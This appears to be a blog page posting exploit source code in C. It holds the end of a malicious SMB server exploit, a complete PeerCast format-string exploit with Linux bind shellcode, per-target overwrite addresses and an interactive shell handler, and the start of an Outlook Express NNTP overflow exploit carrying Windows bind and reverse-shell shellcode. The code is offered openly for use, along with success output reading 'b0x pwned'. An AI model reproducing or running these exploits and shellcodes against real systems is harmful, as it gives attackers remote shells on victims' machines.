	unsigned char ntlm_challenge1[] = "\xa2\x75\x1b\x10\xe7\x62\xb0\xc3";
	unsigned char ntlm_challenge2[] = "\xe1\xed\x43\x66\xc7\xa7\x36\xbd";

	bzero ( &response, sizeof ( response ) );
	recv ( s, response, sizeof ( response ) -1, 0 );

	printf ( "SessionSetupAndXNeg\n" );
	SessionSetupAndXNeg[30] = response[30];
	SessionSetupAndXNeg[31] = response[31];
	SessionSetupAndXNeg[34] = response[34];
	SessionSetupAndXNeg[35] = response[35];

	strncpy ( SessionSetupAndXNeg + 32, ( unsigned char* ) &userid, 2 );
	if ( option == 0 )
		memcpy ( SessionSetupAndXNeg + 71, ntlm_challenge1, 8 );
	else
		memcpy ( SessionSetupAndXNeg + 71, ntlm_challenge2, 8 );

	send ( s, SessionSetupAndXNeg, sizeof ( SessionSetupAndXNeg ) -1, 0 );

	bzero ( &response, sizeof ( response ) );
	recv ( s, response, sizeof ( response ) -1, 0 );

	printf ( "SessionSetupAndXAuth\n" );
	SessionSetupAndXAuth[30] = response[30];
	SessionSetupAndXAuth[31] = response[31];
	SessionSetupAndXAuth[34] = response[34];
	SessionSetupAndXAuth[35] = response[35];

	strncpy ( SessionSetupAndXAuth + 32, ( unsigned char* ) &userid, 2 );

	send ( s, SessionSetupAndXAuth, sizeof ( SessionSetupAndXAuth ) -1, 0 );

	bzero ( &response, sizeof ( response ) );
	recv ( s, response, sizeof ( response ) -1, 0 );

	printf ( "TreeConnectAndX\n" );
	TreeConnectAndX[30] = response[30];
	TreeConnectAndX[31] = response[31];
	TreeConnectAndX[34] = response[34];
	TreeConnectAndX[35] = response[35];

	strncpy ( TreeConnectAndX + 28, ( unsigned char* ) &treeid, 2 );
	strncpy ( TreeConnectAndX + 32, ( unsigned char* ) &userid, 2 );

	send ( s, TreeConnectAndX, sizeof ( TreeConnectAndX ) -1, 0 );
}

void
digg ( int s, unsigned long fid, unsigned long assocgroup, unsigned long userid, unsigned long treeid, int option )
{
	int ret;
	char response[1024];
	unsigned char srv[] = "\x73\x72\x76";
	unsigned char wks[] = "\x77\x6b\x73";

	bzero ( &response, sizeof ( response ) );
	recv ( s, response, sizeof ( response ) -1, 0 );

	printf ( "SmbNtCreate\n" );
	SmbNtCreate[30] = response[30];
	SmbNtCreate[31] = response[31];
	SmbNtCreate[34] = response[34];
	SmbNtCreate[35] = response[35];

	strncpy ( SmbNtCreate + 28, ( unsigned char* ) &treeid, 2 );
	strncpy ( SmbNtCreate + 32, ( unsigned char* ) &userid, 2 );
	strncpy ( SmbNtCreate + 42, ( unsigned char* ) &fid, 2 );

	send ( s, SmbNtCreate, sizeof ( SmbNtCreate ) -1, 0 );

	bzero ( &response, sizeof ( response ) );
	recv ( s, response, sizeof ( response ) -1, 0 );

	printf ( "DceRpc\n" );
	DceRpc[30] = response[30];
	DceRpc[31] = response[31];
	DceRpc[34] = response[34];
	DceRpc[35] = response[35];

	strncpy ( DceRpc + 28, ( unsigned char* ) &treeid, 2 );
	strncpy ( DceRpc + 32, ( unsigned char* ) &userid, 2 );
	strncpy ( DceRpc + 80, ( unsigned char* ) &assocgroup, 2 );

	ret = check_interface ( response );
	if ( ret == 0 )
		memcpy ( DceRpc + 92, wks, 3 );
	else if ( ret == 1 )
		memcpy ( DceRpc + 92, srv, 3 );
	else if ( ret == 2 );
	else if ( ret == 3 );
	else
	{
		printf ( "invalid interface uuid, aborting...\n" );
		exit ( 1 );
	}

	send ( s, DceRpc, sizeof ( DceRpc ) -1, 0 );

	bzero ( &response, sizeof ( response ) );
	recv ( s, response, sizeof ( response ) -1, 0 );

	if ( option == 1 )
	{
		printf ( "NetrShareEnum\n" );
		NetrShareEnum[30] = response[30];
		NetrShareEnum[31] = response[31];
		NetrShareEnum[34] = response[34];
		NetrShareEnum[35] = response[35];

		strncpy ( NetrShareEnum + 28, ( unsigned char* ) &treeid, 2 );
		strncpy ( NetrShareEnum + 32, ( unsigned char* ) &userid, 2 );

		send ( s, NetrShareEnum, sizeof ( NetrShareEnum ) -1, 0 );
	}
	else if ( ( option == 2 ) && ( ret == 2 ) )
	{
		printf ( "OpenPrinterEx\n" );
		OpenPrinterEx[30] = response[30];
		OpenPrinterEx[31] = response[31];
		OpenPrinterEx[34] = response[34];
		OpenPrinterEx[35] = response[35];

		strncpy ( OpenPrinterEx + 28, ( unsigned char* ) &treeid, 2 );
		strncpy ( OpenPrinterEx + 32, ( unsigned char* ) &userid, 2 );

		send ( s, OpenPrinterEx, sizeof ( OpenPrinterEx ) -1, 0 );

		bzero ( &response, sizeof ( response ) );
		recv ( s, response, sizeof ( response ) -1, 0 );

		printf ( "ClosePrinter\n" );
		ClosePrinter[30] = response[30];
		ClosePrinter[31] = response[31];
		ClosePrinter[34] = response[34];
		ClosePrinter[35] = response[35];

		strncpy ( ClosePrinter + 28, ( unsigned char* ) &treeid, 2 );
		strncpy ( ClosePrinter + 32, ( unsigned char* ) &userid, 2 );

		send ( s, ClosePrinter, sizeof ( ClosePrinter ) -1, 0 );
	}
	else if ( ( option == 3 ) && ( ret == 3 ) )
	{
		printf ( "OpenHklm\n" );
		OpenHklm[30] = response[30];
		OpenHklm[31] = response[31];
		OpenHklm[34] = response[34];
		OpenHklm[35] = response[35];

		strncpy ( OpenHklm + 28, ( unsigned char* ) &treeid, 2 );
		strncpy ( OpenHklm + 32, ( unsigned char* ) &userid, 2 );

		send ( s, OpenHklm, sizeof ( OpenHklm ) -1, 0 );

		bzero ( &response, sizeof ( response ) );
		recv ( s, response, sizeof ( response ) -1, 0 );

		printf ( "OpenKey\n" );
		OpenKey[30] = response[30];
		OpenKey[31] = response[31];
		OpenKey[34] = response[34];
		OpenKey[35] = response[35];

		strncpy ( OpenKey + 28, ( unsigned char* ) &treeid, 2 );
		strncpy ( OpenKey + 32, ( unsigned char* ) &userid, 2 );

		send ( s, OpenKey, sizeof ( OpenKey ) -1, 0 );

		bzero ( &response, sizeof ( response ) );
		recv ( s, response, sizeof ( response ) -1, 0 );

		printf ( "CloseKey\n" );
		CloseKey[30] = response[30];
		CloseKey[31] = response[31];
		CloseKey[34] = response[34];
		CloseKey[35] = response[35];

		strncpy ( CloseKey + 28, ( unsigned char* ) &treeid, 2 );
		strncpy ( CloseKey + 32, ( unsigned char* ) &userid, 2 );

		send ( s, CloseKey, sizeof ( CloseKey ) -1, 0 );
	}
	else if ( option == 4 )
	{
		printf ( "NetBios1\n" );
		NetBios1[30] = response[30];
		NetBios1[31] = response[31];
		NetBios1[34] = response[34];
		NetBios1[35] = response[35];

		strncpy ( NetBios1 + 28, ( unsigned char* ) &treeid, 2 );
		strncpy ( NetBios1 + 32, ( unsigned char* ) &userid, 2 );

		send ( s, NetBios1, sizeof ( NetBios1 ) -1, 0 );
	}
	else
	{
		if ( ret == 0 )
		{
			printf ( "WksSvc\n" );
			WksSvc[30] = response[30];
			WksSvc[31] = response[31];
			WksSvc[34] = response[34];
			WksSvc[35] = response[35];

			strncpy ( WksSvc + 28, ( unsigned char* ) &treeid, 2 );
			strncpy ( WksSvc + 32, ( unsigned char* ) &userid, 2 );

			send ( s, WksSvc, sizeof ( WksSvc ) -1, 0 );
		}
		else
		{
			printf ( "SrvSvc\n" );
			SrvSvc[30] = response[30];
			SrvSvc[31] = response[31];
			SrvSvc[34] = response[34];
			SrvSvc[35] = response[35];

			strncpy ( SrvSvc + 28, ( unsigned char* ) &treeid, 2 );
			strncpy ( SrvSvc + 32, ( unsigned char* ) &userid, 2 );

			send ( s, SrvSvc, sizeof ( SrvSvc ) -1, 0 );
		}
	}

	bzero ( &response, sizeof ( response ) );
	recv ( s, response, sizeof ( response ) -1, 0 );

	printf ( "SmbClose\n" );
	SmbClose[30] = response[30];
	SmbClose[31] = response[31];
	SmbClose[34] = response[34];
	SmbClose[35] = response[35];

	strncpy ( SmbClose + 28, ( unsigned char* ) &treeid, 2 );
	strncpy ( SmbClose + 32, ( unsigned char* ) &userid, 2 );

	send ( s, SmbClose, sizeof ( SmbClose ) -1, 0 );
}

void
exploit ( int s, unsigned long fid, unsigned long assocgroup, unsigned long userid, unsigned long treeid )
{
	char response[1024];

	bzero ( &response, sizeof ( response ) );
	recv ( s, response, sizeof ( response ) -1, 0 );

	printf ( "NetBios2\n" );
	NetBios2[30] = response[30];
	NetBios2[31] = response[31];
	NetBios2[34] = response[34];
	NetBios2[35] = response[35];

	strncpy ( NetBios2 + 28, ( unsigned char* ) &treeid, 2 );
	strncpy ( NetBios2 + 32, ( unsigned char* ) &userid, 2 );

	send ( s, NetBios2, sizeof ( NetBios2 ) -1, 0 );

	bzero ( &response, sizeof ( response ) );
	recv ( s, response, sizeof ( response ) -1, 0 );

	printf ( "Trans2Response1\n" );
	Trans2Response1[30] = response[30];
	Trans2Response1[31] = response[31];
	Trans2Response1[34] = response[34];
	Trans2Response1[35] = response[35];

	strncpy ( Trans2Response1 + 28, ( unsigned char* ) &treeid, 2 );
	strncpy ( Trans2Response1 + 32, ( unsigned char* ) &userid, 2 );

	send ( s, Trans2Response1, sizeof ( Trans2Response1 ) -1, 0 );

	bzero ( &response, sizeof ( response ) );
	recv ( s, response, sizeof ( response ) -1, 0 );

	printf ( "Trans2Response2\n" );
	Trans2Response2[30] = response[30];
	Trans2Response2[31] = response[31];
	Trans2Response2[34] = response[34];
	Trans2Response2[35] = response[35];

	strncpy ( Trans2Response2 + 28, ( unsigned char* ) &treeid, 2 );
	strncpy ( Trans2Response2 + 32, ( unsigned char* ) &userid, 2 );

	send ( s, Trans2Response2, sizeof ( Trans2Response2 ) -1, 0 );

	bzero ( &response, sizeof ( response ) );
	recv ( s, response, sizeof ( response ) -1, 0 );

	printf ( "Trans2Response3\n" );
	Trans2Response3[30] = response[30];
	Trans2Response3[31] = response[31];
	Trans2Response3[34] = response[34];
	Trans2Response3[35] = response[35];

	strncpy ( Trans2Response3 + 28, ( unsigned char* ) &treeid, 2 );
	strncpy ( Trans2Response3 + 32, ( unsigned char* ) &userid, 2 );

	send ( s, Trans2Response3, sizeof ( Trans2Response3 ) -1, 0 );
}

int
main ( int argc, char* argv[] )
{
	int s1, s2, i;
	unsigned long fid = 0x1337;
	unsigned long treeid = 0x0808;
	unsigned long userid = 0x0808;
	unsigned long assocgroup = 0x4756;
	pid_t childpid;
	socklen_t clilen;
	struct sockaddr_in cliaddr, servaddr;

	bzero ( &servaddr, sizeof ( servaddr ) );
	servaddr.sin_family = AF_INET;
	servaddr.sin_addr.s_addr = htonl ( INADDR_ANY );
	servaddr.sin_port = htons ( PORT );

	s1 = socket ( AF_INET, SOCK_STREAM, 0 );
	bind ( s1, ( struct sockaddr * ) &servaddr, sizeof ( servaddr ) );
	listen ( s1, 1 );

	clilen = sizeof ( cliaddr );

	s2 = accept ( s1, ( struct sockaddr * ) &cliaddr, &clilen );

	close ( s1 );

	printf ( "\n%s\n\n", inet_ntoa ( cliaddr.sin_addr ) );

	neg ( s2 );                                             // Negotiate
	sessionsetup ( s2, userid, treeid, 0 );                 // SessionSetup
	for ( i = 0; i < 15; i++ )
	{
		digg ( s2, fid, assocgroup, userid, treeid, 0 );
		fid++;
		assocgroup ++;
	}
	digg ( s2, fid, assocgroup, userid, treeid, 1 );        // NetrShareEnum
	fid++;
	assocgroup ++;
	digg ( s2, fid, assocgroup, userid, treeid, 2 );        // spoolss
	fid++;
	assocgroup ++;
	for ( i = 0; i < 4; i++ )
	{
		digg ( s2, fid, assocgroup, userid, treeid, 0 );
		fid++;
		assocgroup ++;
	}
	digg ( s2, fid, assocgroup, userid, treeid, 3 );         // WinReg
	userid++;
	treeid++;
	sessionsetup ( s2, userid, treeid, 1 );                  // SessionSetup
	userid--;
	treeid--;
	for ( i = 0; i < 2; i++ )
	{
		digg ( s2, fid, assocgroup, userid, treeid, 4 );     // NetBios
		fid++;
		assocgroup ++;
	}
	treeid += 2;
	exploit ( s2, fid, assocgroup, userid, treeid );

	printf ( "done!\n" );

	close ( s2 );
}

(Comment on this)
Saturday, June 18th, 2005
1:28 pm 	
PeerCast Format String Exploit

under development...

/*
              __              __                   _
  _______  __/ /_  ___  _____/ /__________  ____  (_)____
 / ___/ / / / __ \/ _ \/ ___/ __/ ___/ __ \/ __ \/ / ___/
/ /__/ /_/ / /_/ /  __/ /  / /_/ /  / /_/ / / / / / /__
\___/\__, /_.___/\___/_/   \__/_/   \____/_/ /_/_/\___/
    /____/

--[ exploit by : cybertronic - cybertronic[at]gmx[dot]net
--[ connecting to 127.0.0.1:7144...done!
--[ using bind shellcode
--[ GOT: 0x0809da9c
--[ RET: 0x41ad8a82
--[ sending packet [ 196 bytes ]...done!
--[ sleeping 5 seconds before connecting to 127.0.0.1:20000...
--[ connecting to 127.0.0.1:20000...done!
--[ b0x pwned - h4ve phun
//bin/sh: error while loading shared libraries: libc.so.6: failed to map segment from shared object: Cannot allocate memory

*/

#include

#define NOP     0x90

#define RED     "\E[31m\E[1m"
#define GREEN   "\E[32m\E[1m"
#define YELLOW  "\E[33m\E[1m"
#define BLUE    "\E[34m\E[1m"
#define NORMAL  "\E[m"

int connect_to_remote_host ( char* tip, unsigned short tport );
int exploit ( int s, unsigned long smashaddr, unsigned long writeaddr, int sub );
int shell ( int s, char* tip );
int usage ( char* name );

void connect_to_bindshell ( char* tip, unsigned short bport );
void header ();
void wait ( int sec );

// bad chars: 0x00, 0x0a, 0x0d, 0x3f

/***********************
 * Linux x86 Shellcode *
 ***********************/

// 93 bytes bindcode, modified to remove badchar 0x3f, see comment
// -cybertronic

char bindshell[] =
"\x31\xdb"				// xor ebx, ebx
"\xf7\xe3"				// mul ebx
"\xb0\x66"				// mov al, 102
"\x53"					// push ebx
"\x43"					// inc ebx
"\x53"					// push ebx
"\x43"					// inc ebx
"\x53"					// push ebx
"\x89\xe1"				// mov ecx, esp
"\x4b"					// dec ebx
"\xcd\x80"				// int 80h
"\x89\xc7"				// mov edi, eax
"\x52"					// push edx
"\x66\x68\x4e\x20"			// push word 8270
"\x43"					// inc ebx
"\x66\x53"				// push bx
"\x89\xe1"				// mov ecx, esp
"\xb0\xef"				// mov al, 239
"\xf6\xd0"				// not al
"\x50"					// push eax
"\x51"					// push ecx
"\x57"					// push edi
"\x89\xe1"				// mov ecx, esp
"\xb0\x66"				// mov al, 102
"\xcd\x80"				// int 80h
"\xb0\x66"				// mov al, 102
"\x43"					// inc ebx
"\x43"					// inc ebx
"\xcd\x80"				// int 80h
"\x50"					// push eax
"\x50"					// push eax
"\x57"					// push edi
"\x89\xe1"				// mov ecx, esp
"\x43"					// inc ebx
"\xb0\x66"				// mov al, 102
"\xcd\x80"				// int 80h
"\x89\xd9"				// mov ecx, ebx
"\x89\xc3"				// mov ebx, eax
"\xb0\x3e"				// mov al, 62			[ changed 63 to 62 to remove 0x3f ]
"\x40"					// inc eax			[ change 62 to 63 ]
"\x49"					// dec ecx
"\xcd\x80"				// int 80h
"\x41"					// inc ecx
"\xe2\xf7"				// loop lp			[ adjust loop: changed 0xf8 to 0xf7 ]
"\x51"					// push ecx
"\x68\x6e\x2f\x73\x68"			// push dword 68732f6eh
"\x68\x2f\x2f\x62\x69"			// push dword 69622f2fh
"\x89\xe3"				// mov ebx, esp
"\x51"					// push ecx
"\x53"					// push ebx
"\x89\xe1"				// mov ecx, esp
"\xb0\xf4"				// mov al, 244
"\xf6\xd0"				// not al
"\xcd\x80";				// int 80h
//"\x90\x90\x90\x90"
//"\x90\x90\x90\x90"
//"\xe9\xf8\xff\xff\xff";

typedef struct _args {
	char* tip;
	char* lip;
	int tport;
	int target;
} args;

struct targets {
	int num;
	unsigned long smashaddr;
	unsigned long writeaddr;
	int sub;
	char name[64];
}

//HIGHJACKED: 0809da9c R_386_JUMP_SLOT   usleep

target[]= {
	{ 0, 0x0809da9c, 0x41acfab9, 36, "SuSE Linux 9.0 Kernel: 2.4.21-99-default" },
	{ 1, 0x0809da9c, 0x41ad1c13, 36, "SuSE Linux 9.0 Kernel: 2.4.21-99-default" },
	{ 2, 0x0809da9c, 0x41ad6841, 36, "SuSE Linux 9.0 Kernel: 2.4.21-99-default" },
	{ 3, 0x0809da9c, 0x41ad6a40, 36, "SuSE Linux 9.0 Kernel: 2.4.21-99-default" },
	{ 4, 0x0809da9c, 0x41ad8a82, 37, "SuSE Linux 9.0 Kernel: 2.4.21-99-default" },
	{ 5, 0x0809da9c, 0xdeadc0de, 36, "description" } //add more targets if needed
};

int
check ( unsigned long addr )
{
	char tmp[128];

	snprintf ( tmp, sizeof ( tmp ), "%d", addr );
	if ( atoi( tmp ) < 1 )
	addr = addr + 256;
	return ( addr );
}

int
connect_to_remote_host ( char* tip, unsigned short tport )
{
	int s;
	struct sockaddr_in remote_addr;
	struct hostent* host_addr;

	memset ( &remote_addr, 0x0, sizeof ( remote_addr ) );
	if ( ( host_addr = gethostbyname ( tip ) ) == NULL )
	{
		printf ( "cannot resolve \"%s\"\n", tip );
		exit ( 1 );
	}
	remote_addr.sin_family = AF_INET;
	remote_addr.sin_port = htons ( tport );
	remote_addr.sin_addr = * ( ( struct in_addr * ) host_addr->h_addr );
	if ( ( s = socket ( AF_INET, SOCK_STREAM, 0 ) ) < 0 )
	{
		printf ( "socket failed!\n" );
		exit ( 1 );
	}
	printf ( "--[ connecting to %s:%u...", tip, tport  );
	if ( connect ( s, ( struct sockaddr * ) &remote_addr, sizeof ( struct sockaddr ) ) ==  -1 )
	{
		printf ( "failed!\n" );
		exit ( 1 );
	}
	printf ( "done!\n" );
	return ( s );
}

int
exploit ( int s, unsigned long smashaddr, unsigned long writeaddr, int sub )
{
	char buffer[2048];
	int a, b, c, d;
	int cn1, cn2, cn3, cn4;
	unsigned int bal1, bal2, bal3, bal4;
	unsigned long ulcbip;

	printf ( "--[ GOT: 0x%08x\n", smashaddr );
	printf ( "--[ RET: 0x%08x\n", writeaddr );

	a = ( smashaddr & 0xff000000 ) >> 24;
	b = ( smashaddr & 0x00ff0000 ) >> 16;
	c = ( smashaddr & 0x0000ff00 ) >> 8;
	d = ( smashaddr & 0x000000ff );

	bal1 = ( writeaddr & 0xff000000 ) >> 24;
	bal2 = ( writeaddr & 0x00ff0000 ) >> 16;
	bal3 = ( writeaddr & 0x0000ff00 ) >> 8;
	bal4 = ( writeaddr & 0x000000ff );

	cn1 = bal4 - sub;
	cn1 = check ( cn1 );
	cn2 = bal3 - bal4;
	cn2 = check ( cn2 );
	cn3 = bal2 - bal3;
	cn3 = check ( cn3 );
	cn4 = bal1 - bal2;
	cn4 = check ( cn4 );

	bzero ( &buffer, sizeof ( buffer ) );

	//double write does not work here

	sprintf ( buffer,
	"GET /html/en/index.html"
	"%c%c%c%c"
	"%c%c%c%c"
	"%c%c%c%c"
	"%c%c%c%c"
	"%%%du%%1265$n%%%du%%1266$n%%%du%%1267$n%%%du%%1268$n",
	d,     c, b, a,
	d + 1, c, b, a,
	d + 2, c, b, a,
	d + 3, c, b, a,
	cn1,
	cn2,
	cn3,
	cn4 );

	memset ( buffer + strlen ( buffer ), NOP, 16 );
	memcpy ( buffer + strlen ( buffer ), bindshell, sizeof ( bindshell ) -1 );
	strcat ( buffer, "\r\n\r\n" );

	printf ( "--[ sending packet [ %u bytes ]...", strlen ( buffer ) );
	if ( write ( s, buffer, strlen ( buffer ) ) <= 0 )
	{
		printf ( "failed!\n" );
		return ( 1 );
	}
	printf ( "done!\n"  );

	return ( 0 );
}

int
shell ( int s, char* tip )
{
	int n;
	char buffer[2048];
	fd_set fd_read;

	printf ( "--[" YELLOW " b" NORMAL "0" YELLOW "x " NORMAL "p" YELLOW "w" NORMAL "n" YELLOW "e" NORMAL "d " YELLOW "- " NORMAL "h" YELLOW "4" NORMAL "v" YELLOW "e " NORMAL "p" YELLOW "h" NORMAL "u" YELLOW "n" NORMAL "\n" );

	FD_ZERO ( &fd_read );
	FD_SET ( s, &fd_read );
	FD_SET ( 0, &fd_read );

	while ( 1 )
	{
		FD_SET ( s, &fd_read );
		FD_SET ( 0, &fd_read );

		if ( select ( s + 1, &fd_read, NULL, NULL, NULL ) < 0 )
			break;
		if ( FD_ISSET ( s, &fd_read ) )
		{
			if ( ( n = recv ( s, buffer, sizeof ( buffer ), 0 ) ) < 0 )
			{
				printf ( "bye bye...\n" );
				return;
			}
			if ( write ( 1, buffer, n ) < 0 )
			{
				printf ( "bye bye...\n" );
				return;
			}
		}
		if ( FD_ISSET ( 0, &fd_read ) )
		{
			if ( ( n = read ( 0, buffer, sizeof ( buffer ) ) ) < 0 )
			{
				printf ( "bye bye...\n" );
				return;
			}
			if ( send ( s, buffer, n, 0 ) < 0 )
			{
				printf ( "bye bye...\n" );
				return;
			}
		}
		usleep(10);
	}
}

int
usage ( char* name )
{
	int i;

	printf ( "\n" );
	printf ( "Usage: %s -h  -p  -t \n", name );
	printf ( "\n" );
	printf ( "Targets\n\n" );
	for ( i = 0; i < 6; i++ )
		printf ( "\t[%d] [0x%08x] [0x%08x] [%s]\n", target[i].num, target[i].smashaddr, target[i].writeaddr, target[i].name );
	printf ( "\n" );
	exit ( 1 );
}

void
connect_to_bindshell ( char* tip, unsigned short bport )
{
	int s;
	int sec = 5; // change this for fast targets
	struct sockaddr_in remote_addr;
	struct hostent *host_addr;

	if ( ( host_addr = gethostbyname ( tip ) ) == NULL )
	{
		fprintf ( stderr, "cannot resolve \"%s\"\n", tip );
		exit ( 1 );
	}

	remote_addr.sin_family = AF_INET;
	remote_addr.sin_addr   = * ( ( struct in_addr * ) host_addr->h_addr );
	remote_addr.sin_port   = htons ( bport );

	if ( ( s = socket ( AF_INET, SOCK_STREAM, 0 ) ) < 0 )
	{
		printf ( "socket failed!\n" );
		exit ( 1 );
	}
	printf ("--[ sleeping %d seconds before connecting to %s:%u...\n", sec, tip, bport );
	wait ( sec );
	printf ( "--[ connecting to %s:%u...", tip, bport );
	if ( connect ( s, ( struct sockaddr * ) &remote_addr, sizeof ( struct sockaddr ) ) ==  -1 )
	{
		printf ( RED "failed!\n" NORMAL);
		exit ( 1 );
	}
	printf ( YELLOW "done!\n" NORMAL);
	shell ( s, tip );
}

void
header ()
{
	printf ( "              __              __                   _           \n" );
	printf ( "  _______  __/ /_  ___  _____/ /__________  ____  (_)____      \n" );
	printf ( " / ___/ / / / __ \\/ _ \\/ ___/ __/ ___/ __ \\/ __ \\/ / ___/  \n" );
	printf ( "/ /__/ /_/ / /_/ /  __/ /  / /_/ /  / /_/ / / / / / /__        \n" );
	printf ( "\\___/\\__, /_.___/\\___/_/   \\__/_/   \\____/_/ /_/_/\\___/  \n" );
	printf ( "    /____/                                                     \n\n" );
	printf ( "--[ exploit by : cybertronic - cybertronic[at]gmx[dot]net\n" );
}

void
parse_arguments ( int argc, char* argv[], args* argp )
{
	int i = 0;

	while ( ( i = getopt ( argc, argv, "h:p:t:" ) ) != -1 )
	{
		switch ( i )
		{
			case 'h':
				argp->tip = optarg;
				break;
			case 'p':
				argp->tport = atoi ( optarg );
				break;
			case 't':
				argp->target = strtoul ( optarg, NULL, 16 );
				break;
			case ':':
			case '?':
			default:
				usage ( argv[0] );
	    }
    }

    if ( argp->tip == NULL || argp->tport < 1 || argp->tport > 65535 ||  argp->target < 0 || argp->target > 5 )
		usage ( argv[0] );
}

void
wait ( int sec )
{
	sleep ( sec );
}

int
main ( int argc, char* argv[] )
{
	int s;
	args myargs;

	system ( "clear" );
	header ();
	parse_arguments ( argc, argv, &myargs );
	s = connect_to_remote_host ( myargs.tip, myargs.tport );

	printf ( "--[ using bind shellcode\n" );
	if ( exploit ( s, target[myargs.target].smashaddr, target[myargs.target].writeaddr, target[myargs.target].sub ) == 1 )
	{
		printf ( "exploitation failed!\n" );
		exit ( 1 );
	}
	connect_to_bindshell ( myargs.tip, 20000 );
	close ( s );
	return 0;
}


(Comment on this)
1:23 pm 	
Microsoft Outlook Express NNTP Response Parsing Buffer Overflow

under development...

#include

#define RED	"\E[31m\E[1m"
#define GREEN	"\E[32m\E[1m"
#define YELLOW	"\E[33m\E[1m"
#define BLUE	"\E[34m\E[1m"
#define NORMAL	"\E[m"

#define PORT	119

int isip ( char *ip );
int shell ( int s, char* tip, unsigned short cbport );

void connect_to_bindshell ( char* tip, unsigned short bport );
void exploit ( int s, int option );
void header ();
void start_reverse_handler ( unsigned short cbport );
void wait ( int sec );

/*********************
* Windows Shellcode *
*********************/

/*
 * win32_bind
 * removed a lot of bad chars
 */

unsigned char scode[] =
"\x31\xc9\x83\xe9\xb0\xd9\xee\xd9\x74\x24\xf4\x5b\x81\x73\x13\x0f"
"\xf8\xfd\x75\x83\xeb\xfc\xe2\xf4\xf3\x92\x16\x38\xe7\x01\x02\x8a"
"\xf0\x98\x76\x19\x2b\xdc\x76\x30\x33\x73\x81\x70\x77\xf9\x12\xfe"
"\x40\xe0\x76\x2a\x2f\xf9\x16\x3c\x84\xcc\x76\x74\xe1\xc9\x3d\xec"
"\xa3\x7c\x3d\x01\x08\x39\x37\x78\x0e\x3a\x16\x81\x34\xac\xd9\x5d"
"\x7a\x1d\x76\x2a\x2b\xf9\x16\x13\x84\xf4\xb6\xfe\x50\xe4\xfc\x9e"
"\x0c\xd4\x76\xfc\x63\xdc\xe1\x14\xcc\xc9\x26\x11\x84\xbb\xcd\xfe"
"\x4f\xf4\x76\x05\x13\x55\x76\x35\x07\xa6\x95\xfb\x41\xf6\x11\x25"
"\xf0\x2e\x9b\x26\x69\x90\xce\x47\x67\x8f\x8e\x47\x50\xac\x02\xa5"
"\x67\x33\x10\x89\x34\xa8\x02\xa3\x50\x71\x18\x13\x8e\x15\xf5\x77"
"\x5a\x92\xff\x8a\xdf\x90\x24\x7c\xfa\x55\xaa\x8a\xd9\xab\xae\x26"
"\x5c\xab\xbe\x26\x4c\xab\x02\xa5\x69\x90\xec\x29\x69\xab\x74\x94"
"\x9a\x90\x59\x6f\x7f\x3f\xaa\x8a\xd9\x92\xed\x24\x5a\x07\x2d\x1d"
"\xab\x55\xd3\x9c\x58\x07\x2b\x26\x5a\x07\x2d\x1d\xea\xb1\x7b\x3c"
"\x58\x07\x2b\x25\x5b\xac\xa8\x8a\xdf\x6b\x95\x92\x76\x3e\x84\x22"
"\xf0\x2e\xa8\x8a\xdf\x9e\x97\x11\x69\x90\x9e\x18\x86\x1d\x97\x25"
"\x56\xd1\x31\xfc\xe8\x92\xb9\xfc\xed\xc9\x3d\x86\xa5\x06\xbf\x58"
"\xf1\xba\xd1\xe6\x82\x82\xc5\xde\xa4\x53\x95\x07\xf1\x4b\xeb\x8a"
"\x7a\xbc\x02\xa3\x54\xaf\xaf\x24\x5e\xa9\x97\x74\x5e\xa9\xa8\x24"
"\xf0\x28\x95\xd8\xd6\xfd\x33\x26\xf0\x2e\x97\x8a\xf0\xcf\x02\xa5"
"\x84\xaf\x01\xf6\xcb\x9c\x02\xa3\x5d\x07\x2d\x1d\xff\x72\xf9\x2a"
"\x5c\x07\x2b\x8a\xdf\xf8\xfd\x75";

/*
unsigned char bindshell[] =
"\x31\xc9\x83\xe9\xaf\xd9\xee\xd9\x74\x24\xf4\x5b\x81\x73\x13\x92"
"\x35\x88\x95\x83\xeb\xfc\xe2\xf4\x6e\x5f\x63\xda\x7a\xcc\x77\x6a"
"\x6d\x55\x03\xf9\xb6\x11\x03\xd0\xae\xbe\xf4\x90\xea\x34\x67\x1e"
"\xdd\x2d\x03\xca\xb2\x34\x63\x76\xa2\x7c\x03\xa1\x19\x34\x66\xa4"
"\x52\xac\x24\x11\x52\x41\x8f\x54\x58\x38\x89\x57\x79\xc1\xb3\xc1"
"\xb6\x1d\xfd\x76\x19\x6a\xac\x94\x79\x53\x03\x99\xd9\xbe\xd7\x89"
"\x93\xde\x8b\xb9\x19\xbc\xe4\xb1\x8e\x54\x4b\xa4\x52\x51\x03\xd5"
"\xa2\xbe\xc8\x99\x19\x45\x94\x38\x19\x75\x80\xcb\xfa\xbb\xc6\x9b"
"\x7e\x65\x77\x43\xa3\xee\xee\xc6\xf4\x5d\xbb\xa7\xfa\x42\xfb\xa7"
"\xcd\x61\x77\x45\xfa\xfe\x65\x69\xa9\x65\x77\x43\xcd\xbc\x6d\xf3"
"\x13\xd8\x80\x97\xc7\x5f\x8a\x6a\x42\x5d\x51\x9c\x67\x98\xdf\x6a"
"\x44\x66\xdb\xc6\xc1\x66\xcb\xc6\xd1\x66\x77\x45\xf4\x5d\x99\xc9"
"\xf4\x66\x01\x74\x07\x5d\x2c\x8f\xe2\xf2\xdf\x6a\x44\x5f\x98\xc4"
"\xc7\xca\x58\xfd\x36\x98\xa6\x7c\xc5\xca\x5e\xc6\xc7\xca\x58\xfd"
"\x77\x7c\x0e\xdc\xc5\xca\x5e\xc5\xc6\x61\xdd\x6a\x42\xa6\xe0\x72"
"\xeb\xf3\xf1\xc2\x6d\xe3\xdd\x6a\x42\x53\xe2\xf1\xf4\x5d\xeb\xf8"
"\x1b\xd0\xe2\xc5\xcb\x1c\x44\x1c\x75\x5f\xcc\x1c\x70\x04\x48\x66"
"\x38\xcb\xca\xb8\x6c\x77\xa4\x06\x1f\x4f\xb0\x3e\x39\x9e\xe0\xe7"
"\x6c\x86\x9e\x6a\xe7\x71\x77\x43\xc9\x62\xda\xc4\xc3\x64\xe2\x94"
"\xc3\x64\xdd\xc4\x6d\xe5\xe0\x38\x4b\x30\x46\xc6\x6d\xe3\xe2\x6a"
"\x6d\x02\x77\x45\x19\x62\x74\x16\x56\x51\x77\x43\xc0\xca\x58\xfd"
"\x62\xbf\x8c\xca\xc1\xca\x5e\x6a\x42\x35\x88\x95";

unsigned char reverseshell[] =
"\xEB\x10\x5B\x4B\x33\xC9\x66\xB9\x25\x01\x80\x34\x0B\x99\xE2\xFA"
"\xEB\x05\xE8\xEB\xFF\xFF\xFF\x70\x62\x99\x99\x99\xC6\xFD\x38\xA9"
